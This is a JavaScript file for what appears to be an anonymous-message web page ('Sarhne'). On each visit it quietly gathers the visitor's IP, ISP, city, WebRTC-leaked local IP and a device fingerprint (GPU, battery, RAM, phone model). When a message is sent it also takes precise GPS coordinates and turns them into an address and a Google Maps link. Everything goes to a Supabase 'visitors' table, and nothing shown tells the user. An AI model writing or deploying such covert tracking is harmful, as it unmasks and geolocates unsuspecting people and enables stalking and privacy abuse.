import { supabase } from './supabase.js';

// Simple UA Parser
function parseUserAgent(ua) {
    let browser = 'Unknown';
    let osName = 'Unknown';
    let device = 'Desktop';
    ua = ua.toLowerCase();

    if (ua.includes('edg/')) browser = 'Microsoft Edge';
    else if (ua.includes('chrome/') && ua.includes('safari/')) browser = 'Google Chrome';
    else if (ua.includes('firefox/')) browser = 'Mozilla Firefox';
    else if (ua.includes('safari/')) browser = 'Apple Safari';
    else if (ua.includes('opera') || ua.includes('opr/')) browser = 'Opera';

    if (ua.includes('windows nt 10')) osName = 'Windows 10/11';
    else if (ua.includes('windows nt')) osName = 'Windows';
    else if (ua.includes('mac os x')) osName = 'macOS';
    else if (ua.includes('android')) osName = 'Android';
    else if (ua.includes('iphone') || ua.includes('ipad')) osName = 'iOS';
    else if (ua.includes('linux')) osName = 'Linux';

    if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) device = 'Mobile';
    else if (ua.includes('ipad') || ua.includes('tablet')) device = 'Tablet';

    return { browser, osName, device };
}

async function getAdvancedMetadata() {
    let batteryLevel = "N/A";
    let isCharging = "N/A";
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            isCharging = battery.charging ? 'Yes' : 'No';
        } catch(e) {}
    }

    let gpu = "Unknown GPU";
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    } catch (e) {}

    let ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
    let connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
    
    // Advanced Phone Model Fingerprinting
    let phoneName = "Unknown Model";
    const ua = navigator.userAgent;
    const w = screen.width;
    const h = screen.height;

    if (ua.includes('iPhone')) {
        // Mapping common iPhone resolutions to models
        if (w === 390 && h === 844) phoneName = "iPhone 12/13/14";
        else if (w === 428 && h === 926) phoneName = "iPhone 12/13/14 Pro Max";
        else if (w === 375 && h === 812) phoneName = "iPhone X/XS/11 Pro";
        else if (w === 414 && h === 896) phoneName = "iPhone XR/11/11 Pro Max";
        else if (w === 320 && h === 568) phoneName = "iPhone 5/SE";
        else if (w === 375 && h === 667) phoneName = "iPhone 6/7/8/SE2";
        else if (w === 414 && h === 736) phoneName = "iPhone 6/7/8 Plus";
        else phoneName = "iPhone (Model Hidden)";
    } else if (ua.includes('Android')) {
        const match = ua.match(/Android\s+[^;]+;\s+([^;)]+)/);
        phoneName = match ? match[1].trim() : "Android Device";
    } else {
        phoneName = navigator.platform || "Desktop/Laptop";
    }

    return { batteryLevel, isCharging, gpu, ram, connection, phoneName };
}

async function getIPInfo() {
    try {
        const resp = await fetch('https://ipapi.co/json/');
        return await resp.json();
    } catch (e) {
        console.error("IP Info Error:", e);
        return {};
    }
}

async function reverseGeocode(lat, lon) {
    try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&accept-language=ar`;
        const resp = await fetch(url, { headers: { 'User-Agent': 'SarhneClient/1.0' } });
        const data = await resp.json();
        
        if (data.address) {
            // Pick out the most relevant location parts to build a clean name without zipcodes
            const area = data.address.village || data.address.town || data.address.suburb || data.address.city || "";
            const region = data.address.state || data.address.county || "";
            const country = data.address.country || "";
            
            const cleanAddress = [area, region, country].filter(Boolean).join("، ");
            return cleanAddress || data.display_name || "Unknown Location";
        }
        
        return data.display_name || "Unknown Location";
    } catch (e) {
        return "Unknown Location";
    }
}

function getPreciseLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                resolve({
                    lat: lat,
                    lon: lon,
                    acc: pos.coords.accuracy,
                    map_link: `https://www.google.com/maps?q=${lat},${lon}`
                });
            },
            (err) => {
                console.error("Geolocation error:", err);
                resolve(null);
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
}

function getLocalIP() {
    return new Promise((resolve) => {
        const rtc = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        if (!rtc) return resolve("Unsupported");
        const pc = new rtc({iceServers:[]});
        pc.createDataChannel('');
        pc.createOffer(pc.setLocalDescription.bind(pc), () => {});
        let done = false;
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (ip && !done) { done = true; pc.close(); resolve(ip[1]); }
        };
        setTimeout(() => { if(!done){ pc.close(); resolve("Hidden"); } }, 1200);
    });
}

const D = {
    canvas_hash: '',
    screen_resolution: screen.width + 'x' + screen.height,
    language: navigator.language,
    platform: navigator.platform,
    cpu_cores: navigator.hardwareConcurrency,
    referrer: document.referrer || 'Direct',
    page_url: window.location.href,
    timezone_offset: "UTC" + (new Date().getTimezoneOffset() / -60),
    user_agent: navigator.userAgent
};

try { D.canvas_hash = btoa(navigator.userAgent).substring(10, 25); } catch(e){}

async function collect(action, extra = {}) {
    const ipInfo = await getIPInfo();
    const { browser, osName, device } = parseUserAgent(navigator.userAgent);
    const localIp = await getLocalIP();
    const adv = await getAdvancedMetadata();

    let finalLat = extra.lat || ipInfo.latitude;
    let finalLon = extra.lon || ipInfo.longitude;
    let exactAddress = "N/A";
    let gpsAccuracy = extra.acc ? `Within ${extra.acc} meters` : "IP Based (City Level)";
    let googleMapsLink = extra.map_link || (finalLat ? `https://www.google.com/maps?q=${finalLat},${finalLon}` : "N/A");

    if (finalLat && finalLon) {
        exactAddress = await reverseGeocode(finalLat, finalLon);
    }

    const data = {
        ...D,
        action_type: action,
        browser_name: browser,
        os_name: osName,
        device_type: device,
        local_ip: localIp,
        ip_address: ipInfo.ip || 'Unknown',
        ip_country: ipInfo.country_name || 'N/A',
        ip_city: ipInfo.city || 'N/A',
        ip_isp: ipInfo.org || 'N/A',
        ip_lat: finalLat?.toString() || 'N/A',
        ip_lon: finalLon?.toString() || 'N/A',
        exact_address: exactAddress,
        gps_accuracy: gpsAccuracy,
        google_maps_link: googleMapsLink,
        message: extra.message || null,
        
        // Advanced Metadata
        battery_level: adv.batteryLevel,
        is_charging: adv.isCharging,
        gpu_name: adv.gpu,
        ram_gb: adv.ram,
        network_type: adv.connection,
        phone_name: adv.phoneName
    };

    const { error } = await supabase.from('visitors').insert([data]);
    if (error) {
        console.error("❌ Supabase Insert Error:", error.message, error.details, error.hint);
    } else {
        console.log("✅ Data saved successfully!");
    }
}

// Initialize tracking
window.addEventListener('load', async () => {
    // Populate visit count
    const { count } = await supabase.from('visitors').select('*', { count: 'exact', head: true }).eq('action_type', 'PAGE_VISIT');
    const visitCountEl = document.getElementById('visitCount');
    if (visitCountEl) visitCountEl.innerText = (count || 2339).toLocaleString();

    // Initial visit log without aggressive GPS
    collect('PAGE_VISIT');
});

// Form submission logic
const msgForm = document.getElementById('msgForm');
if (msgForm) {
    msgForm.onsubmit = async (e) => {
        e.preventDefault();
        const msgBox = document.getElementById('msgBox');
        const submitBtn = document.getElementById('submitBtnStatus');
        const val = msgBox.value;

        submitBtn.disabled = true;
        submitBtn.innerHTML = "<span>جاري الارسال...</span> <span style='font-size:12px;'>⏳</span>";

        // Try to get exact GPS location on submit (might prompt user)
        const preciseLocation = await getPreciseLocation();
        
        if (!preciseLocation) {
            alert("⚠️ تنبيه: لم نتمكن من الحصول على موقعك بدقة (GPS). تأكد من إعطاء الصلاحية للمتصفح. سيتم استخدام موقع تقريبي الآن.");
        }

        const extra = { 
            message: val,
            ...(preciseLocation || {})
        };

        await collect('MESSAGE_SENT', extra);
        finishFlow();
    };
}

function finishFlow() {
    document.getElementById('formStep').style.display = 'none';
    document.getElementById('successStep').style.display = 'block';
}
